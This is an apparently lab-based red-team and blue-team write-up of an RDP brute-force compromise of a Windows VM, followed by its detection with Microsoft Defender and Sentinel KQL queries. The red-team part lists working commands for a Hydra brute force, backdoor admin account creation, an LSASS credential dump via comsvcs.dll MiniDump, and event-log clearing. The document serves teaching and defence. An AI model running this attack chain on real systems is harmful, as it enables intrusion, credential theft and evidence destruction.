# 🚨 Red Team Engagement
***Referencing NIST 800-115***  

> **Disclaimer**: The following documentation highlights malicious tactics and techniques used **exclusively** for **authorized Red Team** or penetration-testing exercises in alignment with **NIST SP 800-115** (Technical Guide to Information Security Testing and Assessment). Any real-world, unauthorized execution of these steps is **illegal** and unethical.

---

## Platforms, Tools and Languages Leveraged
- Windows 10 Virtual Machine
- Kali Linux Virtual Machine
- Bash
- Powershell
- Oracle VM VirtualBox
- RDP
- Hydra

---

## 1. Overview
During this simulated Red Team engagement, the adversary (operating from a **Kali Linux** machine) identified and brute-forced Remote Desktop Protocol (RDP) on **king-vm**, successfully compromising the **Administrator** account. Once inside, the attacker performed system **enumeration**, **credential dumping**, and **log tampering**. The provided screenshots depict:
- Network scanning and service enumeration from Kali  
- Successful brute force attempts against the Administrator account  
- RDP session establishment and subsequent malicious commands on the target

---

## 2. NIST 800-115 Alignment
NIST SP 800-115 outlines four phases for penetration testing:
1. **Planning**: Defining scope and objectives  
2. **Discovery**: Gathering information, identifying vulnerabilities  
3. **Attack**: Exploiting systems and escalating privileges  
4. **Reporting**: Documenting findings, TTPs, and recommendations  

All malicious activities below were part of a **controlled** Red Team test, following these phases.

---

## 3. Reconnaissance & Initial Access (Kali Machine)
### 3.1 Network Scanning
From the **Kali** host, the attacker scanned the target’s IP to discover open ports/services:
`nmap -p 3389 <TARGET_IP>`

- Found **RDP (3389)** open on **king-vm**.

  ![alt text](https://github.com/K-ING-TECH/Attack-Defense_Adversary-Emulation/blob/main/nMap_Scan.png)

### 3.2 RDP Brute Force
Using a password-guessing tool (**Hydra**) on Kali, the attacker ran repeated login attempts against the **Administrator** account:
`hydra -l Administrator -P /path/to/passwordlist.txt rdp://<TARGET_IP>`
- Eventually gained a **valid** password for the built-in **Administrator** user.  
- This is visible in the screenshots, showing successful brute force output.

  ![alt text](https://github.com/K-ING-TECH/Attack-Defense_Adversary-Emulation/blob/main/Hydra_Enumeration.png)
  ![alt text](https://github.com/K-ING-TECH/Attack-Defense_Adversary-Emulation/blob/main/Credential_Discovery.png)

### 3.3 Establishing RDP Session
With a **valid password** discovered, the adversary used an RDP client from Kali (or any remote RDP client) to log in:
`rdesktop <TARGET_IP> -u Administrator -p <DiscoveredPassword>`
- Successfully accessed the **king-vm** desktop.  
- The screenshots show the attacker’s remote desktop session from Kali.

![alt text](https://github.com/K-ING-TECH/Attack-Defense_Adversary-Emulation/blob/main/RDP_Initiation.png)
![alt text](https://github.com/K-ING-TECH/Attack-Defense_Adversary-Emulation/blob/main/Successful_RDP.png)

---

## 4. Post-Exploitation Activities on king-vm
Once inside, the attacker performed several key actions.

### 4.1 System Enumeration
Commands executed:
```
whoami
hostname
winver
systeminfo
ipconfig /all
arp -a
```

Identified OS version, patch level, network configuration, and local user context (administrator).

### 4.2 Privilege Escalation & Persistence
Administrator Account Modification

``` net user administrator Plokijuhy ```
Attempt to change Administrator password.
Creating a New Local Admin


```
net user EvilAdmin P@ssw0rd /add
net localgroup administrators EvilAdmin /add
```

Gave **EvilAdmin** full administrative privileges.

Malicious Service Creation

```
sc create EvilService
```

Used to register a potentially malicious service in the registry for persistence or lateral movement.

#### Modified registry keys under `HKCU`

### 4.3 Credential Dumping
```
tasklist | findstr lsass
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump 648 C:\lsass.dmp full
```

Dumped LSASS process into `C:\lsass.dmp`, allowing offline credential extraction (NTLM hashes or clear-text passwords if available).

### 4.4 Log Tampering
```
wevtutil el
wevtutil cl "Application"
wevtutil cl "Windows PowerShell"
```

Attempted clearing event logs with wevtutil to cover tracks. Some operations returned “Access is denied”, but the intent was clear.

---

## 5 MITRE ATT&CK Techniques
**T1078 - Valid Accounts:** Gaining admin access via brute force.

**T1003 - Credential Dumping:** Dumped LSASS memory using rundll32 comsvcs.dll, MiniDump.

**T1136 - Create Account:** Created “EvilAdmin” for persistent access.

**T1543 - Create or Modify System Process:** Registered new service EvilService to maintain foothold.

**T1070.001 - Log Deletion:** Attempted to clear event logs via wevtutil.

---

## 6. Findings & Recommendations

- Use MFA for RDP logins, secure jump host, a VPN or close the port

- Enforce lockout policies after multiple failed attempts

- Observe NSG rules and firewall rules for any open holes (exposed ports)

- Enable LSASS protections (e.g., Credential Guard)

- Regularly monitor for MiniDump or suspicious processes


- Alert on event log clearing attempts and new service creation

- Monitor for repeated login failures or brute force patterns

- Rename or disable default **Administrator** and any other default accounts such as **Guest** if not strictly required

- Implement password rotation and store credentials in a secure vault.

- All commands ran on the target machine by the attacker recorded here:
[recorded commands](https://github.com/K-ING-TECH/Attack-Defense_Adversary-Emulation/blob/main/Windows_CMD_Output.txt)

---

### 7. Conclusion
From their **Kali** attack box, the Red Team scanned, brute-forced, and established RDP access to **king-vm** using the default **Administrator** account. Post-compromise, they performed reconnaissance, created new administrator accounts, dumped credentials from LSASS, and attempted to delete Windows event logs. This scenario illustrates how unsecured RDP endpoints can lead to devastating intrusions. Following **NIST SP 800-115** guidelines, the organization can implement stricter remote access controls, better monitoring, and robust credential policies to mitigate similar threats in the future.




---------------------------------------------------------------






# 🧢 Blue Team Engagement 
***NIST 800-61 Compliant***  

## Overview
A suspicious process (`rundll32 C:\Windows\System32\comsvcs.dll, MiniDump`) was detected on **king-vm** using the **Administrator** account. Further investigation revealed an **RDP brute force** attack from a remote IP and subsequent **privilege escalation**, account modifications, and potential data exfiltration attempts. This report follows the **NIST 800-61 Incident Response Lifecycle**, aligning with **Preparation**, **Detection & Analysis**, **Containment**, **Eradication & Recovery**, and **Post-Incident Activity** steps.

---

## Platforms and Languages Leveraged
- Windows 10 Virtual Machine (king-vm)
- EDR Platform: Microsoft Defender for Endpoint (MDE)
- SIEM: Microsoft Sentinel
- Kusto Query Language (KQL)
- Log Analytics Workspace

---

## 2. Detection & Analysis
### 2.1 Suspicious Process Identification
A system alert indicated:
`rundll32 C:\Windows\System32\comsvcs.dll, MiniDump 0 C:\lsass.dmp full`

This command can be associated with **LSASS credential dumping**.

![alt text](https://github.com/K-ING-TECH/Attack-Defense_Adversary-Emulation/blob/main/Alert.png)

```kql
DeviceProcessEvents
| where Timestamp > ago(24h)
| where DeviceName == "king-vm"
| order by Timestamp desc
| project Timestamp, InitiatingProcessFileName, ProcessCommandLine, InitiatingProcessAccountName, DeviceName
| where InitiatingProcessAccountName != "system"
```

Findings
Device: king-vm
Process: rundll32 with comsvcs.dll, indicating potential LSASS dump
User: **Administrator** (suspicious, given the nature of command)

![alt text](https://github.com/K-ING-TECH/Attack-Defense_Adversary-Emulation/blob/main/query1.png)


### 2.2 Brute Force RDP Discovery
An investigation into login events showed repeated failed login attempts against the Administrator account from 174.176.x.x until success at 2025-03-03T16:56:00.9833312Z via **winnit.exe** (commonly associated with RDP on port 3389).

```
DeviceLogonEvents
| where DeviceName == "king-vm"
| where AccountName == "administrator"
| order by Timestamp asc 
| project TimeGenerated, AccountName, ActionType, LogonType, RemoteIP
| order by TimeGenerated asc
```

Findings
Brute Force Start: 2025-03-03T16:32:50.6834465Z
Brute Force Success: 2025-03-03T16:56:00.9833312Z
Remote IP: 174.176.x.x

![alt text](https://github.com/K-ING-TECH/Attack-Defense_Adversary-Emulation/blob/main/query2.png)

### 2.3 Administrator Account Activity ±20 Minutes of Breach
Evidence of system reconnaissance, credential dumping, and suspicious account modifications.

```
let TimeofBreach = todatetime("2025-03-03T16:56:00.9833312Z");
DeviceProcessEvents
| where DeviceName == "king-vm"
| where InitiatingProcessAccountName == "administrator"
| where Timestamp between (TimeofBreach - 20m .. TimeofBreach + 20m)
| project Timestamp, DeviceName, InitiatingProcessAccountName, 
         ProcessCommandLine, FolderPath
| order by Timestamp desc
```

![alt text](https://github.com/K-ING-TECH/Attack-Defense_Adversary-Emulation/blob/main/query3.png)

#### Reconnaissance Commands:
`systeminfo, hostname, whoami, winver` – confirming OS details, user identity, and system version.
Potential Account Modification
`net user administrator Plokijuhy` – Attempt to change Admin password.
WebView & Edge Usage
`msedgewebview2.exe & msedge.exe` with extensive command-line flags – Possibly to bypass security controls or deliver a payload.
System Processes & Execution
`cmd.exe, conhost.exe, rundll32.exe, ie4uinit.exe` -ClearIconCache – Indicate manual, hands-on-keyboard activity.

### 2.4 Possible Data Exfiltration
`backgroundtransferhost.exe` used for data transfer around the breach timeframe, potentially bypassing SmartScreen.

```
let TimeofBreach = todatetime("2025-03-03T16:56:00.9833312Z");
DeviceNetworkEvents
| where DeviceName == "king-vm"
| where InitiatingProcessAccountName == "administrator"
| where Timestamp between (TimeofBreach - 20m .. TimeofBreach + 20m)
| order by Timestamp desc
```

![alt text](https://github.com/K-ING-TECH/Attack-Defense_Adversary-Emulation/blob/main/query4.png)

Findings
Initiating Process: **backgroundtransferhost.exe**
SmartScreen Bypass: Indicated by logs

### 2.5 Further Malicious Behavior
Service Creation & Registry Edits – Potential to gain persistence or hide tracks.

Clearing Logs: wevtutil.exe usage to erase Windows event logs.

Additional Account Creation

**EvilAdmin** with password P@**ssw0rd**, promoted to administrator privileges.
Suggests attacker establishing a backdoor administrative account.

```
DeviceProcessEvents
| where DeviceName == "king-vm"
| where InitiatingProcessAccountName == "administrator"
| where FileName has_any ("net.exe", "net1.exe")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessParentFileName
```

![alt text](https://github.com/K-ING-TECH/Attack-Defense_Adversary-Emulation/blob/main/query5.png)
![alt text](https://github.com/K-ING-TECH/Attack-Defense_Adversary-Emulation/blob/main/query6.png)

## 3. Containment
Isolate the Device: Used Microsoft Defender for Endpoint to isolate **king-vm** from the network to halt external connections and further lateral movement.

Password Resets: Enforced immediate reset of the Administrator account password and disabled suspicious new accounts (**EvilAdmin**).

Firewall & NSG Checks: Began reviewing inbound RDP rules to close external access and restrict port 3389 exposure.

## 4. Eradication & Recovery
Malware Scan: Performed comprehensive antivirus and anti-malware scans to remove any planted executables or persistent footholds.

Registry & Service Cleanup: Verified registry keys to remove malicious entries; disabled suspicious services.

System Restoration: Leveraged known-good backups (if required) to ensure system integrity.

Log Preservation: Collected event logs, memory dumps, and relevant artifacts for forensics before reintroducing the system to production.

## 5. Post-Incident Activity
#### Lessons Learned
RDP Hardening: Close or restrict RDP ports, enforce multi-factor authentication for remote admin access, and monitor for repeated login failures.

Strict Account Management: Implement stronger password policies and continuous monitoring of local administrator account usage.

Attack Surface Reduction: Strengthen SmartScreen enforcement and Attack Surface Reduction (ASR) rules in MDE to block suspicious tools/processes.

Log & Alert Enhancements: Improve Sentinel correlation rules to detect suspicious account creations, rundll32 usage with LSASS, and repeated login attempts.

User Education: Reinforce training about safe remote protocols and potential account takeover threats.

#### Future Recommendations
Network Segmentation: Isolate critical servers from direct exposure to the internet; restrict RDP via VPN or jump boxes.

Multi-Factor Authentication (MFA): Mandatory for Administrator logins, especially from external networks.

Continuous Threat Hunting: Regularly conduct hunts for known TTPs such as credential dumping, log tampering, and unauthorized privilege escalations.

Incident Response Exercises: Perform tabletop exercises simulating brute force and unauthorized account creation to ensure swift detection and containment.

## MITRE ATT&CK TTPs
**Initial Access (TA0001) – T1078 (Valid Accounts):** RDP brute force success.

**Credential Access (TA0006) – T1003 (Credential Dumping):** LSASS dump via rundll32 comsvcs.dll.

**Execution (TA0002) – T1204.002 (User Execution):** Attacker manually launching commands (cmd.exe, net.exe).

**Persistence (TA0003) – T1136 (Create Account):** Creation of EvilAdmin account for ongoing access.

**Privilege Escalation (TA0004) – T1078.002 (Administrator Accounts):** Compromised Admin account.

**Defense Evasion (TA0005) – T1070 (Indicator Removal on Host):** wevtutil.exe usage for log clearing.

**Exfiltration (TA0010) – T1041 (Exfiltration Over C2 Channel):** Potential data transfer via backgroundtransferhost.exe.

## Summary
A brute force RDP attack on king-vm allowed an adversary to run LSASS dumping commands, modify the Administrator account, create a new EvilAdmin account, and potentially exfiltrate data. Microsoft Defender for Endpoint and Microsoft Sentinel provided the alerts and logs necessary to uncover the activity. NIST 800-61 procedures guided the containment (device isolation, account lockdowns), eradication (malware scans, service cleanup), and recovery (system restoration) phases. Post-incident analysis highlights the need for robust RDP hardening, multi-factor authentication, improved logging and alerting, and proactive threat hunting to mitigate future credential-based compromises.

## Resolution:

- **Isolate the Device:**
Leveraged Microsoft Defender for Endpoint or similar EDR tools to immediately take the affected system (king-vm) offline, preventing any further attacker communication or lateral movement.

- **Reset Compromised Credentials:**
Updated the Administrator account password to a strong, unique credential. Suspicious or newly created local accounts (e.g., EvilAdmin) were disabled or removed to lock out the attacker.

- **Firewall & NSG Modifications:**
Reviewed and restricted inbound RDP access via the host firewall and network security group (NSG) configurations. Ensured only authorized IP ranges or VPN tunnels could connect to port 3389.

- **Log & Artifact Preservation:**
Collected event logs (e.g., DeviceProcessEvents, DeviceLogonEvents), memory dumps (like lsass.dmp), and registry hives for forensic analysis. Ensured a proper chain of custody was followed, preserving critical evidence.

- **System Restoration & Re-deployment:**
After verifying no residual threats remained, re-imaged the machine from a known-good backup. Re-deployed it with updated security baselines (e.g., hardened RDP, stronger password policies, and multi-factor authentication).
